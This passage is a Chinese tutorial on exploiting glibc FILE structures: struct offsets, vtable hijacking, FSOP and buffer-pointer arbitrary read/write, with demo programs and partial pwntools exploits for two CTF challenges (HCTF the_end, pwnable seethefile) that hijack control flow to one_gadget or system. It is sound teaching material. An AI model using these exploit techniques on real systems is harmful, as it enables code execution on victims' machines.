<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h4 data-content="1" id="09d46c0e4a2a21a50afa24f386465224">基本数据结构</h4>
<ul>
<li>
<p>glibc通过fopen函数调用为用户返回一个FILE的描述符，该FILE实际是一个结构体。该结构被一系列流函数操作。该结构体大致分为三部分</p>
<ul>
<li>_flags文件流的属性标志（fopen的mode参数决定）</li>
<li>缓冲区（为了减少io的syscall掉用）</li>
<li>文件描述符（文件流的唯一性，例如stdin=0，stout = 1）</li>
</ul>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>        <span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="cp">#define _IO_file_flags _flags</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>    <span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>    <span class="cm">/* End of get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>    <span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>    <span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>    <span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>    <span class="cm">/* End of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>    <span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>    <span class="cm">/* End of reserve area. */</span>
  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
<span class="cp">#if 0</span><span class="c"></span>
<span class="c">  int _blksize;</span>
<span class="cp">#else</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
<span class="cp">#endif</span>
  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

<span class="cp">#define __HAVE_COLUMN </span><span class="cm">/* temporary */</span><span class="cp"></span>
  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif</span>
<span class="cp">#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span>
  <span class="n">_IO_off64_t</span> <span class="n">_offset</span><span class="p">;</span>
<span class="cp"># if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
<span class="cp"># else</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad1</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad2</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad3</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad4</span><span class="p">;</span>
<span class="cp"># endif</span>
  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don't get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="cp">#endif</span>
<span class="p">};</span>
</pre></div>
</li>
<li>
<p>但实际上，glibc会在FILE结构外包一层IO_FILE_plus结构，就是多了一个vtable（虚拟函数表，类似C++虚拟函数表）</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
</li>
<li>
<p>其中vtable保存着标准流函数底层调用的函数指针（32bit下在FILE结构偏移0x94处，64bits下在偏移0xd8处）</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="o">*</span> <span class="n">funcs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="cp">#if 0</span><span class="c"></span>
<span class="c">    get_column;</span>
<span class="c">    set_column;</span>
<span class="cp">#endif</span>
<span class="p">};</span>
</pre></div>
</li>
<li>
<p>IO_FILE_plus各种偏移</p>
<div class="highlight"><pre><span></span><span class="mh">0x0</span>   <span class="n">_flags</span>
<span class="mh">0x8</span>   <span class="n">_IO_read_ptr</span>
<span class="mh">0x10</span>  <span class="n">_IO_read_end</span>
<span class="mh">0x18</span>  <span class="n">_IO_read_base</span>
<span class="mh">0x20</span>  <span class="n">_IO_write_base</span>
<span class="mh">0x28</span>  <span class="n">_IO_write_ptr</span>
<span class="mh">0x30</span>  <span class="n">_IO_write_end</span>
<span class="mh">0x38</span>  <span class="n">_IO_buf_base</span>
<span class="mh">0x40</span>  <span class="n">_IO_buf_end</span>
<span class="mh">0x48</span>  <span class="n">_IO_save_base</span>
<span class="mh">0x50</span>  <span class="n">_IO_backup_base</span>
<span class="mh">0x58</span>  <span class="n">_IO_save_end</span>
<span class="mh">0x60</span>  <span class="n">_markers</span>
<span class="mh">0x68</span>  <span class="n">_chain</span>
<span class="mh">0x70</span>  <span class="n">_fileno</span>
<span class="mh">0x74</span>  <span class="n">_flags2</span>
<span class="mh">0x78</span>  <span class="n">_old_offset</span>
<span class="mh">0x80</span>  <span class="n">_cur_column</span>
<span class="mh">0x82</span>  <span class="n">_vtable_offset</span>
<span class="mh">0x83</span>  <span class="n">_shortbuf</span>
<span class="mh">0x88</span>  <span class="n">_lock</span>
<span class="c1">//IO_FILE_complete</span>
<span class="mh">0x90</span>  <span class="n">_offset</span>
<span class="mh">0x98</span>  <span class="n">_codecvt</span>
<span class="mh">0xa0</span>  <span class="n">_wide_data</span>
<span class="mh">0xa8</span>  <span class="n">_freeres_list</span>
<span class="mh">0xb0</span>  <span class="n">_freeres_buf</span>
<span class="mh">0xb8</span>  <span class="n">__pad5</span>
<span class="mh">0xc0</span>  <span class="n">_mode</span>
<span class="mh">0xc4</span>  <span class="n">_unused2</span>
<span class="mh">0xd8</span>  <span class="n">vtable</span>
</pre></div>
</li>
</ul>
<h4 data-content="1" id="618c4a9260c1537d3f295d829f36781a">攻击思路</h4>
<ul>
<li>
<p>##### 针对vtable的利用思路</p>
<ul>
<li>改写vtable的函数指针，触发任意代码执行</li>
<li>伪造vtable，即改写IO_FILE_plus的vtable指针指向我们的fake_vtable，在fake_vtable里布置我们的恶意操作函数。</li>
<li>伪造整个FILE结构。</li>
</ul>
</li>
<li>
<p>##### FSOP(File-Stream-Oriented-Programming)</p>
<ul>
<li>由于所有的FILE结构是通过链表链接的。我们可以控制链表结构，伪造整个文件链。<ul>
<li>_chain</li>
<li>_IO_list_all</li>
</ul>
</li>
<li>执行函数_IO_flush_all_lockp，会flush表上的所有的FILE。通过控制一些量，可以达到任意代码执行的目的。该函数会在以下情况下自行调用。<ul>
<li>产生abort时</li>
<li>执行exit函数时</li>
<li>main函数返回时</li>
</ul>
</li>
</ul>
</li>
<li>
<p>##### 高级利用方式（任意地址读、写）</p>
<ul>
<li>由于gblic的更新，很多对vtable的攻击方式不再适用，换个思路。不再只看向vtable，而是转向stream_buffer。</li>
<li>通过控制_fileno，read_ptr、等等指针我们可以实现任意地址读和任意地址写操作。</li>
</ul>
</li>
</ul>
<ul>
<li>
<p>#### IO缓冲区的攻击</p>
<ul>
<li>
<p>##### 利用fwrite进行任意地址读</p>
<ul>
<li>
<p>对目的fp的设置，以及绕过。</p>
<ul>
<li>设置_fileno为stdout，泄露信息到stdout。</li>
<li>设置_flags &amp; ~ IO_NO_WRITE</li>
<li>设置_flags |= IO_CURENTLY_PUTTING</li>
<li>设置 write_base指向leaked地址的起始，write_ptr指向leaked地址的结束。</li>
<li>设置_IO_read_end == IO_wrie_base。</li>
</ul>
</li>
<li>
<p>相关的检查</p>
<ul>
<li>_flags &amp; ~ IO_NO_WRITE、__flags |= IO_currently_putting设置</li>
</ul>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="p">..........................</span>
  <span class="p">}</span>
    <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">&gt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
    <span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span> <span class="cm">/* Space available. */</span>

  <span class="cm">/* Then fill the buffer. */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
   <span class="p">......................</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">+</span> <span class="n">must_flush</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="p">...................................</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">do_write</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">count</span> <span class="o">=</span> <span class="n">old_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">do_write</span><span class="p">);</span>
    <span class="n">to_do</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;</span> <span class="n">do_write</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">to_do</span><span class="p">;</span>
  <span class="p">}</span>
</pre></div>
<ul>
<li>
<p>_IO_read_end == _IO_write_base检查</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
     <span class="cm">/* On a system without a proper O_APPEND implementation,</span>
<span class="cm">            you would need to sys_seek(0, SEEK_END) here, but is</span>
<span class="cm">            not needed nor desirable for Unix- or Posix-like systems.</span>
<span class="cm">            Instead, just indicate that offset (before and after) is</span>
<span class="cm">            unpredictable. */</span>
         <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_old_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
       <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
         <span class="p">{</span>
           <span class="kt">off_t</span> <span class="n">new_pos</span>
         <span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
           <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
           <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_old_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
         <span class="p">}</span>
</pre></div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>样例<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span> <span class="o">=</span> <span class="s">"treebacker"</span><span class="p">;</span>
    <span class="kt">FILE</span><span class="o">*</span> <span class="n">fp</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"key.txt"</span><span class="p">,</span> <span class="s">"rw"</span><span class="p">);</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="mi">8</span><span class="p">;</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="mh">0x800</span><span class="p">;</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">msg</span><span class="p">;</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">msg</span><span class="o">+</span><span class="mi">10</span><span class="p">;</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span><span class="cm">/*leak msg*/</span>
<span class="p">}</span>
</pre></div>
</li>
</ul>
<p>结果会输出msg的内容，而不是buf的内容。且是输出到stdout。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015084929-a5449b1a-eee5-1.png"/></p>
<ul>
<li>
<p>##### 利用fread函数任意地址写。</p>
<ul>
<li>
<p>绕过检查的设置</p>
<ul>
<li>
<p>_fileno = stdin（从stdin读入）</p>
<p>_flags &amp;= ~ _IO_NO_READS（可写入）</p>
</li>
<li>
<p>read_ptr = read_base = null</p>
</li>
<li>
<p>buf_base指向写入的始地址；buf_end指向写入的末地址。</p>
</li>
<li>
<p>需要 buf_end  - buf_base &lt; fread'd size（允许写入足够的数据）</p>
<ul>
<li>相关的检查代码</li>
</ul>
</li>
<li>
<p>read_ptr = read_base = null。</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">(</span><span class="n">want</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
   <span class="p">{</span>
     <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

     <span class="c1">//缓冲区的内容已经足够，直接memcpy过去。</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">want</span> <span class="o">&lt;=</span> <span class="n">have</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">memcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">want</span><span class="p">);</span>
   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">want</span><span class="p">;</span>
   <span class="n">want</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
   <span class="p">........................</span>
<span class="p">}</span>
   <span class="cm">/* If we now want less than a buffer, underflow and repeat</span>
<span class="cm">      the copy.  Otherwise, _IO_SYSREAD directly to</span>
<span class="cm">      the user buffer. */</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
       <span class="o">&amp;&amp;</span> <span class="n">want</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
     <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="n">__underflow</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
     <span class="k">break</span><span class="p">;</span>

       <span class="k">continue</span><span class="p">;</span>
     <span class="p">}</span>
</pre></div>
</li>
<li>
<p>样例</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">FILE</span><span class="o">*</span> <span class="n">fp</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
  <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"key.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="mi">4</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">msg</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">msg</span><span class="o">+</span><span class="mi">100</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">fp</span><span class="p">);</span>          <span class="c1">//read to msg</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>结果，我们会发现输入的内容存于msg中。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015084952-b28e482a-eee5-1.png"/></p>
<ul>
<li>当程序中不存在任何的文件操作时，要知道我们一直用的标准输入输出函数也可以利用。<ul>
<li>scanf/printf/gets/puts；这些函数最终会调用底层的read和write函数。</li>
<li>他们的文件描述符时stdin、stdout。</li>
<li>覆写缓冲区指针，仍可以任意地址写、读。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 data-content="1" id="f4884f5d20644d0b4634b193c0f87cee">实战</h4>
<ul>
<li>
<p>##### 2018 HCTF the_end</p>
<ul>
<li>
<p>漏洞分析，存在一个任意地址写漏洞，可以5次，每次1byte。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085029-c8fddb0c-eee5-1.png"/></p>
</li>
<li>
<p>利用思路A</p>
<ul>
<li>
<p>利用IO FILE，在exit之后，会调用file_list_all里的函数setbuf。如果我们可以伪造setbuf为one_gadgets就可以利用。</p>
</li>
<li>
<p>坑点1，寻找vtables在libc.so文件的偏移（存储vtbales地址的地址）。</p>
<ul>
<li>
<p>下面的都是假的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085113-e333c25c-eee5-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085225-0e177b58-eee6-1.png"/></p>
</li>
<li>
<p>这个才是真的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085239-160707e8-eee6-1.png"/></p>
</li>
</ul>
</li>
<li>
<p>坑点2，伪造vtables。需要满足我们能够写入的字节数目，在真实的vtables附近寻找。且0x68偏移的位置的值与one_gadget值相差3byte内。</p>
</li>
</ul>
</li>
<li>
<p>exp记录</p>
<p>```python<br/>
vtables_addr = libc_base + 0x3c56f8<br/>
one_gadget = libc_base + 0x45216</p>
<p>fake_vtables = libc_base + 0x3c5588<br/>
target_addr = fake_vtables + 0x58               #setbuf</p>
<p>print "one_gadget ==&gt; " + hex(one_gadget)<br/>
print "vtables ==&gt; " + hex(vtables_addr)<br/>
print "fake_vtables ==&gt; " + hex(fake_vtables)<br/>
print "target_addr ==&gt; " + hex(target_addr)</p>
<p>dbg()<br/>
p.recvline()<br/>
for i in range(2):                              #make a  fake_vtables<br/>
   p.send(p64(vtables_addr+i))<br/>
   p.send(p64(fake_vtables)[i])</p>
</li>
</ul>
</li>
</ul>
<pre><code>for i in range(3):                              #make setbuf is one_gadget
    p.send(p64(target_addr+i))
    p.send(p64(one_gadget)[i])
```</code></pre>
<ul>
<li>
<p>利用思路B</p>
<ul>
<li>
<p>利用exit函数退出时会调用_dl_fini_函数，里面会有一个函数指针，_rtdl_global的一个偏移。调试获得之后，改写这里为one_gadget即可。</p>
<div class="highlight"><pre><span></span><span class="c1"># call   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x5f0f48</span>

<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</pre></div>
</li>
</ul>
</li>
</ul>
<ul>
<li>
<p>##### pwntable的seethefile</p>
<ul>
<li>
<p>漏洞分析，name字段scanf存在溢出，可以覆盖fd，<strong>伪造一个FILE结构</strong>。可以利用flush或者close达到任意代码执行的目的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191015085258-2188c19c-eee6-1.png"/></p>
</li>
<li>
<p>利用过程</p>
<ul>
<li>
<p>伪造file结构</p>
<ul>
<li>设置_flags &amp; 0x2000 = 0</li>
</ul>
</li>
<li>设置read_ptr为";sh"</li>
</ul>
</li>
<li>
<p>伪造vtable，设置flush字段为system</p>
</li>
<li>
<p>exp记录</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="n">name</span> <span class="o">=</span> <span class="s1">'a'</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">name</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">fake_file_addr</span><span class="p">)</span>       <span class="c1">#*fd = fake_file_addr</span>

